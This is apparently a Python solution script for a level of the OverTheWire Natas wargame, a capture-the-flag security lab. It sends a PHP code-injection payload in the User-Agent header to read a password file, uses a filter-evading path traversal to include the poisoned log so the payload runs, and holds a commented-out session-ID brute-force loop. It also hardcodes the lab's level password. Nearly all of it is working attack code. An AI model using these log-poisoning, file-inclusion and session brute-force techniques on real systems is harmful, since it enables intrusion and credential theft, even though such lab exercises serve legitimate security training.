import requests
import datetime
import sys
import re
import datetime

from string import * 

key  = 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'
user = 'natas26'
url  = 'http://natas26.natas.labs.overthewire.org'


#cookies are encode like this:
# 123-<username> as hex 

r = requests.Session();
r.auth = (user,key)

headers = {'User-Agent': '<?php var_dump(file_get_contents("/etc/natas_webpass/natas26")); ?>'}


response = r.get(url,headers=headers)
print ( response.request.headers )
cookie = response.headers['Set-Cookie'].split(';')[0].split('=')[1]
print (cookie)

flag = r.get(url + '?lang=.../...//.../...//.../...//.../...//.../...//var/www/natas/natas25/logs/natas25_' + cookie + '.log',headers=headers)
print (flag.text)

# response = r.post(url + '?debug' ,  data={'name[]' : 'admin'})

# print response.headers
# print response.text

# for i in range(1,641):

#     session_string = `i` + '-admin'
#     print 'request sessionid', str(i)
    
#     response = r.get(url, cookies={'PHPSESSID': session_string.encode('hex') })
#     if ( 'Password:' in response.text ):
#         print response.text
#         break


# time_start = datetime.datetime.now();

# req = requests.post('http://' + user +':'+ key +"@"+ url, payload)

# time_end = datetime.datetime.now();

# #print time_end - time_start

# print(req.request.body)
# print(req.request.headers)

# print('\n{}\n\n{}'.format(
#     '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
#     req.text,
# ))
